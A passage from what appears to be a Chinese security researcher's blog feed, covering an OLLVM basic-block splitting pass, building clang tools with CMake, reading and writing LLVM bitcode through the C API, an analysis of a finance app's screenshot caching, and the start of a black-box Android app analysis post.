class="string">&quot;split&quot;</span>, cl::init(<span class="literal">false</span>),cl::desc(<span class="string">&quot;Enable basic block splitting&quot;</span>))</span></span>;</span><br><span class="line">+<span class="number">433</span>     MPM.<span class="built_in">add</span>(<span class="built_in">createSplitBasicBlock</span>(Split));</span><br></pre></td></tr></table></figure><p>IPO的LLVMBuild.txt：<br><code>+required_libraries=Obfus</code></p><p>ok，此时编译完成后，opt参数列表里就有了<code>-split</code>。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>split PASS的实现：</p><ul><li><p>保存Function的所有Block；</p></li><li><p>逐个处理Block，对非单一指令BB和不包含PHI指令的BB进行分割；</p></li><li><p>生成乱序表；</p></li><li><p>乱序处理Block中的指令；</p></li><li><p>具体处理单个指令的方法：<br><code>*BasicBlock-&gt;splitBasicBlock(BasicBlock::iterator,*BasicBlock-&gt;getName()+&quot;.splist&quot;)</code><br>位于<code>OLLVM/lib/IR/BasicBlock.cpp</code></p><blockquote><p>在指定的指令处将一个基本块一分为二。注意所有在指定指令前的指令会作为原始基本块的一部分,一个无条件分支会被添加到新的BB，余下的指令会被移到新的BB，包括旧BB的终止符。这会使迭代器无效。<br>注意这只针对一下格式合格的BB（有头有尾），并且指定的指令不允许是指令列表的最后一个（会导致生成一个退化的BB，而且内部带终止符）。</p></blockquote></li><li><p>新建一个BB，将指定指令移到新的BB，为新BB添加分支指令；</p></li><li><p>遍历新block的后继block，更新所有PHI节点信息，将原来从旧block出来的分支路径改为从新block出来。</p></li></ul><p>判断PHI节点：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (BasicBlock::iterator II = Successor-&gt;<span class="built_in">begin</span>();</span><br><span class="line">         (PN = dyn_cast&lt;PHINode&gt;(II)); ++II) &#123;</span><br><span class="line">      <span class="keyword">int</span> IDX = PN-&gt;<span class="built_in">getBasicBlockIndex</span>(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">while</span> (IDX != <span class="number">-1</span>) &#123;</span><br><span class="line">        PN-&gt;<span class="built_in">setIncomingBlock</span>((<span class="keyword">unsigned</span>)IDX, New);</span><br><span class="line">        IDX = PN-&gt;<span class="built_in">getBasicBlockIndex</span>(<span class="keyword">this</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里添加几条打印信息代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#++ <span class="number">88</span> </span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;This BB size: &quot;</span>&lt;&lt;curr-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">#++ <span class="number">114</span> </span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;To split instruction: &quot;</span>&lt;&lt;*it&lt;&lt;<span class="string">&quot;\n&quot;</span>;   </span><br><span class="line">#++ <span class="number">125</span> </span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;After split: \n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(BasicBlock::iterator sptit = toSplit-&gt;<span class="built_in">begin</span>();sptit!=toSplit-&gt;<span class="built_in">end</span>();++sptit)&#123;</span><br><span class="line">    <span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;[+] &quot;</span>&lt;&lt;*sptit&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>打印出对BB的分割点。</p><p>对比pass效果<br><code>./clang -save-temps -S -mllvm -split test.c -o test.s</code><br>拿到的是pass处理的汇编文件，和中间文件。<br>对test.bc-&gt;test.ll-&gt;test.s(得到未经过pass处理的汇编文件)，可自行对比（处理的BB会被添上“.split”）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在源代码目录外编译clang例子</title>
    <link href="https://f4ncy.top/2019/02/28/buildexample/"/>
    <id>https://f4ncy.top/2019/02/28/buildexample/</id>
    <published>2019-02-28T08:00:00.000Z</published>
    <updated>2019-02-28T10:35:09.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="在源代码目录外编译clang例子"><a href="#在源代码目录外编译clang例子" class="headerlink" title="在源代码目录外编译clang例子"></a>在源代码目录外编译clang例子</h1><p>之前bitcode读写的例子编译一直报错，CMakeLists.txt改的面目全非，搜索过程中找到一个llvm工具编译的通用模版。</p><h2 id="如何为独立的clang-tool编写CMakeLists-txt"><a href="#如何为独立的clang-tool编写CMakeLists-txt" class="headerlink" title="如何为独立的clang tool编写CMakeLists.txt"></a>如何为独立的clang tool编写CMakeLists.txt</h2><p><code>cmake -DCMAKE_EXPORT_COMPILE_COMMANDS=ON -DCMAKE_PREFIX_PATH=/Users/fancy/Documents/LLVM/build/ </code></p><p>DCMAKE_PREFIX_PATH指定你的llvm编译生成目录</p><p>CMakeLists.txt:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.4.3)</span><br><span class="line"></span><br><span class="line">set(CMAKE_CONFIGURATION_TYPES &quot;Debug;Release&quot; CACHE STRING &quot;Configs&quot; FORCE)</span><br><span class="line">set(CMAKE_SUPPRESS_REGENERATION TRUE)</span><br><span class="line"></span><br><span class="line">############################################################</span><br><span class="line">#   setting Project informations</span><br><span class="line">############################################################</span><br><span class="line"></span><br><span class="line">set(PROJECT_NAME &quot;llvm_bc_parsing_example&quot;)</span><br><span class="line"></span><br><span class="line">set(LIBRARY_LIST )</span><br><span class="line">set(LIBRARY_LIST $&#123;LIBRARY_LIST&#125;   )</span><br><span class="line">set(COMPONENT_LIST mcparser bitwriter bitreader support mc option )</span><br><span class="line"></span><br><span class="line">############################################################</span><br><span class="line">#   generate makefiles</span><br><span class="line">############################################################</span><br><span class="line"></span><br><span class="line">project($&#123;PROJECT_NAME&#125;)</span><br><span class="line"></span><br><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line">message(STATUS &quot;Found LLVM $&#123;LLVM_PACKAGE_VERSION&#125;&quot;)</span><br><span class="line">message(STATUS &quot;Using LLVMConfig.cmake in: $&#123;LLVM_DIR&#125;&quot;)</span><br><span class="line"></span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line">if(LLVM_BUILD_MAIN_SRC_DIR)</span><br><span class="line">  include_directories($&#123;LLVM_BUILD_MAIN_SRC_DIR&#125;/tools/clang/include)</span><br><span class="line">  include_directories($&#123;LLVM_BUILD_BINARY_DIR&#125;/tools/clang/include)</span><br><span class="line">endif()</span><br><span class="line">link_directories($&#123;LLVM_LIBRARY_DIRS&#125;)</span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line"></span><br><span class="line">add_executable($&#123;PROJECT_NAME&#125; main.c)</span><br><span class="line"></span><br><span class="line">if (&quot;$&#123;CMAKE_CXX_COMPILER_ID&#125;&quot; STREQUAL &quot;MSVC&quot;)</span><br><span class="line">  foreach(link_lib IN LISTS LIBRARY_LIST)</span><br><span class="line">    target_link_libraries($&#123;PROJECT_NAME&#125; optimized $&#123;link_lib&#125;)</span><br><span class="line">    target_link_libraries($&#123;PROJECT_NAME&#125; debug     $&#123;link_lib&#125;d)</span><br><span class="line">  endforeach()</span><br><span class="line">else()</span><br><span class="line">  target_link_libraries($&#123;PROJECT_NAME&#125; $&#123;LIBRARY_LIST&#125;)</span><br><span class="line">  set(CMAKE_CXX_FLAGS &quot;-std=c99 -Wno-unused-parameter -fno-strict-aliasing -Weverything -Wno-switch-enum&quot;)</span><br><span class="line">  #set(CMAKE_EXE_LINKER_FLAGS &quot;-static -static-libgcc -static-libstdc++&quot;)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">llvm_map_components_to_libnames(llvm_libs $&#123;COMPONENT_LIST&#125;)</span><br><span class="line">target_link_libraries($&#123;PROJECT_NAME&#125; $&#123;llvm_libs&#125;)</span><br><span class="line"></span><br><span class="line">message(STATUS &quot;User selected librarys = $&#123;LIBRARY_LIST&#125;&quot;)</span><br><span class="line">message(STATUS &quot;User selected components = $&#123;COMPONENT_LIST&#125;&quot;)</span><br><span class="line">message(STATUS &quot;    = $&#123;llvm_libs&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>COMPONENT_LIST添加你的代码需要的库名称（模块名就行，不需要完整的文件名）</p><p><a href="https://heejune.me/2016/08/17/build-your-own-clang-example-outside-of-the-llvm-source-tree/">https://heejune.me/2016/08/17/build-your-own-clang-example-outside-of-the-llvm-source-tree/</a></p><p><a href="https://qiita.com/Chironian/items/8770c8ab833086fb51a9#328cmakeliststxt%E3%81%BE%E3%81%A8%E3%82%81">https://qiita.com/Chironian/items/8770c8ab833086fb51a9#328cmakeliststxt%E3%81%BE%E3%81%A8%E3%82%81</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何读写LLVM bitcode</title>
    <link href="https://f4ncy.top/2019/02/27/RWBitcode/"/>
    <id>https://f4ncy.top/2019/02/27/RWBitcode/</id>
    <published>2019-02-27T08:00:00.000Z</published>
    <updated>2019-03-22T02:19:37.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="如何读写LLVM-bitcode"><a href="#如何读写LLVM-bitcode" class="headerlink" title="如何读写LLVM bitcode"></a>如何读写LLVM bitcode</h1><p>翻译转载</p><p>我已经阅读了社交媒体上的多篇帖子，现在抱怨LLVM有多可怕。<br>存储库太大以至于无法获得有用的信息，每天经常有数百次提交，邮件列表几乎不可能跟踪，现在可执行的可执行文件高达40Mb …</p><p>将那些花絮放在一边 - 一旦你掌握了这头巨兽，LLVM就非常容易使用了。<br>为了帮助人们使用LLVM，我想我会把你会用LLVM做的琐碎的操作示例放在一起 - 解析一个LLVM的中间表示文件（称为bitcode，文件扩展名.bc），然后再写回来。</p><p>首先，我们浏览一些高级LLVM术语：</p><ul><li>对于用户代码来说LLVM的主要抽象对象是Module。它是一个包含所有函数，全局变量，以及你或用户编写的代码指令的类。</li><li>Bitcode文件实际上是LLVM Module的序列化，以便可以在一个不同的程序中重组。</li><li>LLVM实验MemoryBuffer 对象来处理来自文件、标准输入或数组的数据</li></ul><p>以我的例子，我将使用LLVM C API - 一个比LLVM内核C++头文件更稳定的抽象。如果你希望使用多个版本的LLVM代码，那么C API非常有用，他比LLVM C++头文件更稳定。（另外，我将LLVM广泛用于我的工作，几乎每周都会有一些LLVM C++头文件被更改以破坏我们的代码。而C API从来不会。）</p><p>这里，我将假设你已经启动了LLVM，构建完并安装了它。像这样执行一下简单的步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://git.llvm.org/git/llvm.git &lt;llvm dir&gt;</span><br><span class="line">cd &lt;llvm dir&gt;</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=RELEASE -DCMAKE_INSTALL_PREFIX=install ..</span><br><span class="line">cmake --build . --target install</span><br></pre></td></tr></table></figure><p>以上步骤完成后，你将会得到一个安装在/build/install下的LLVM</p><p>至此，对于一些小可执行文件我使用了CMake。CMake是目前为止结合LLVM的最简单的方法，LLVM也使用它作为自己的构建系统。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">project</span>(llvm_bc_parsing_example)</span><br><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.4</span>.<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># option to allow a user to specify where an LLVM install is on the system</span></span><br><span class="line"><span class="keyword">set</span>(LLVM_INSTALL_DIR <span class="string">&quot;&quot;</span> CACHE <span class="keyword">STRING</span> <span class="string">&quot;An LLVM install directory.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;$&#123;LLVM_INSTALL_DIR&#125;&quot;</span> <span class="keyword">STREQUAL</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">message</span>(FATAL_ERROR <span class="string">&quot;LLVM_INSTALL_DIR not set! Set it to the location of an LLVM install.&quot;</span>)</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># fixup paths to only use the Linux convention</span></span><br><span class="line"><span class="keyword">string</span>(REPLACE <span class="string">&quot;\\&quot;</span> <span class="string">&quot;/&quot;</span> LLVM_INSTALL_DIR <span class="variable">$&#123;LLVM_INSTALL_DIR&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tell CMake where LLVM&#x27;s module is</span></span><br><span class="line"><span class="keyword">list</span>(APPEND CMAKE_MODULE_PATH <span class="variable">$&#123;LLVM_INSTALL_DIR&#125;</span>/lib/cmake/llvm)</span><br><span class="line"></span><br><span class="line"><span class="comment"># include LLVM</span></span><br><span class="line"><span class="keyword">include</span>(LLVMConfig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span>(llvm_bc_parsing_example main.c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_include_directories</span>(llvm_bc_parsing_example PUBLIC <span class="variable">$&#123;LLVM_INCLUDE_DIRS&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(llvm_bc_parsing_example PUBLIC LLVMBitReader LLVMBitWriter)</span><br></pre></td></tr></table></figure><p>所以现在我们已经完成了CMake的设置，我们可以使用现有的LLVM安装，现在我们可以开始使用我们的实际C代码了！<br>因此，要使用LLVM C API，主要需要一个头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/Core.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们需要两个额外的头文件来执行bitcode的读写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/BitReader.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/BitWriter.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>现在我们开始我们主要实现的功能，假设使用2个命令行参数，第一个是输入文件，第二个是输出文件。如果一个接收到以‘-’为文件名的参数，这意味着从标准输入读取或向标准输出写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">3</span> != argc)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Invalid command line!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> inputFilename = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> outputFilename = argv[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>所以首先我们扫描输入文件。我们将从其他输入或一个文件名得到一个LLVM内存缓冲对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">LLVMMemoryBufferRef memoryBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if we are to read our input file from stdin</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="string">&#x27;-&#x27;</span> == inputFilename[<span class="number">0</span>]) &amp;&amp; (<span class="string">&#x27;\0&#x27;</span> == inputFilename[<span class="number">1</span>])) &#123;</span><br><span class="line">  <span class="keyword">char</span> *message;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMCreateMemoryBufferWithSTDIN(&amp;memoryBuffer, &amp;message)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, message);</span><br><span class="line">    <span class="built_in">free</span>(message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">char</span> *message;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMCreateMemoryBufferWithContentsOfFile(</span><br><span class="line">               inputFilename, &amp;memoryBuffer, &amp;message)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, message);</span><br><span class="line">    <span class="built_in">free</span>(message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完这些代码后，memoryBuffer就可以读取我们的bitcode文件转为LLVM module。现在我们创建module</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// now create our module using the memory buffer</span></span><br><span class="line">LLVMModuleRef <span class="keyword">module</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != LLVMParseBitcode2(memoryBuffer, &amp;<span class="keyword">module</span>)) &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Invalid bitcode detected!\n&quot;</span>);</span><br><span class="line">  LLVMDisposeMemoryBuffer(memoryBuffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// done with the memory buffer now, so dispose of it</span></span><br><span class="line">LLVMDisposeMemoryBuffer(memoryBuffer);</span><br></pre></td></tr></table></figure><p>一旦我们得到module，我们不再需要memory buffer了，我们直接释放这部分内存。我们设法获取了一个LLVM bitcode文件，将其反序列化为一个LLVM module，之后就可以随你操作了。因此假设你已经使用LLVM module完成了所有操作了，并希望写回bitcode文件.</p><p>方法和读取方法正交，我们寻找特殊文件名‘-’做相应处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check if we are to write our output file to stdout</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="string">&#x27;-&#x27;</span> == outputFilename[<span class="number">0</span>]) &amp;&amp; (<span class="string">&#x27;\0&#x27;</span> == outputFilename[<span class="number">1</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMWriteBitcodeToFD(<span class="keyword">module</span>, STDOUT_FILENO, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to write bitcode to stdout!\n&quot;</span>);</span><br><span class="line">    LLVMDisposeModule(<span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMWriteBitcodeToFile(<span class="keyword">module</span>, outputFilename)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to write bitcode to file!\n&quot;</span>);</span><br><span class="line">    LLVMDisposeModule(<span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们需要对内存清理，删除module：<br><code>LLVMDisposeModule(module);</code></p><p>我们现在就可以扫描并输出一个LLVM bitcode文件。<br><a href="https://github.com/sheredom/llvm_bc_parsing_example">GitHub Example</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>京东“盗图”事件分析</title>
    <link href="https://f4ncy.top/2019/02/27/jdanalysis/"/>
    <id>https://f4ncy.top/2019/02/27/jdanalysis/</id>
    <published>2019-02-27T02:41:40.000Z</published>
    <updated>2019-02-27T02:45:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="京东“盗图”事件分析"><a href="#京东“盗图”事件分析" class="headerlink" title="京东“盗图”事件分析"></a>京东“盗图”事件分析</h1><p>这里还是利用上次讲的trace来宏观分析函数调用流。</p><p>利用ddms的trace功能，记录用户截图时，“京东金融app”在后台执行的函数流：<br><img src="/2019/02/27/jdanalysis/15512338044303.jpg" alt="w500"></p><p>涉及函数和截图有关，尝试搜索“screenshot”：<br><img src="/2019/02/27/jdanalysis/15512338738873.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512338842904.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512338942294.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512339034349.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512339165953.jpg" alt="w500"></p><p>这里省略了一些方法，主要涉及两个类：GlobalShotListener和ScreenShotListenManager</p><p>先看ScreenShotListenManager：<br><img src="/2019/02/27/jdanalysis/15512339408059.jpg" alt="w600"><br>注册全局的媒体内容观察者。响应函数：</p><p><img src="/2019/02/27/jdanalysis/15512339976224.jpg" alt="w400"><br>打印了一些截图信息，交给监听类处理:</p><p><img src="/2019/02/27/jdanalysis/15512340746782.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512341339635.jpg" alt="w500"><br>设置的监听响应对象是GlobalShotListener的实例。</p><p>看一下GlobalShotListener：</p><p><img src="/2019/02/27/jdanalysis/15512341701005.jpg" alt="w400"><br>响应函数调用gainShotBusinessItemGet</p><p><img src="/2019/02/27/jdanalysis/15512341886179.jpg" alt="w500"></p><p><img src="/2019/02/27/jdanalysis/15512342068041.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342154699.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342219927.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342390445.jpg" alt="w600"></p><p><img src="/2019/02/27/jdanalysis/15512342910972.jpg" alt="w500"><br>generateKey是由图片信息组成的类似文件名的特征字符串。<br>根据特征字符串在缓存文件中检索指定文件。</p><p><img src="/2019/02/27/jdanalysis/15512342982748.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512343179085.jpg" alt="w600"><br><img src="/2019/02/27/jdanalysis/15512343262746.jpg" alt="w500"><br>这里就能看到缓存文件夹的创建和使用，即涉事文件夹“uil-image”。</p><p>以上是事件涉及的函数。总结一下流程：<br>应用全局监听媒体内容变化（截图事件），出现截图后，根据uri信息获取图片信息，拿到图片路径后，生成特征字符串再本地缓存图片，供其他功能调用，这里只看到图片预览功能，未发现任何网络相关操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>纯黑盒（不脱壳）app测试</title>
    <link href="https://f4ncy.top/2019/02/25/blackhook/"/>
    <id>https://f4ncy.top/2019/02/25/blackhook/</id>
    <published>2019-02-25T06:04:40.000Z</published>
    <updated>2019-02-25T06:07:26.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="纯黑盒（不脱壳）app测试"><a href="#纯黑盒（不脱壳）app测试" class="headerlink" title="纯黑盒（不脱壳）app测试"></a>纯黑盒（不脱壳）app测试</h1><p>之前做一个项目，需要分析出协议是否可以被攻击者模拟利用，app使用了加固，协议进行了加密，在完全黑盒的情况下进行测试。</p><p>一般情况下我们分析协议，直接反编译apk，找请求发包代码，一层层往上找，或者利用url关键字搜索，很容易发现参数处理的代码，还原逻辑，比较简单的甚至可以直接复制代码就能模拟协议了。<br>但是在黑盒的情况下，想拿到代码不太现实。收费版加固的强度还是足够的，脱壳需要的精力太大，不脱壳又看不到实现代码，无法还原逻辑。所以这里就讲一下纯黑盒下的协议分析。</p><p>这里涉及的技术其实就是动态分析技术，不是动态调试哦，一般的壳都会带反调试功能的。<br>动态分析工具在不侵入应用代码的情况下，获取应用执行的函数和调用顺序。通过筛选函数信息，完成对应用实现逻辑的大体还原。</p><h2 id="Traceview-Xposed"><a href="#Traceview-Xposed" class="headerlink" title="Traceview+Xposed"></a>Traceview+Xposed</h2><p>traceview是ddms里的一个功能，android studio也集成了（AS里的Record有时会报失败的错误）。<br><img src="/2019/02/25/blackhook/15508004241993.jpg"><br><img 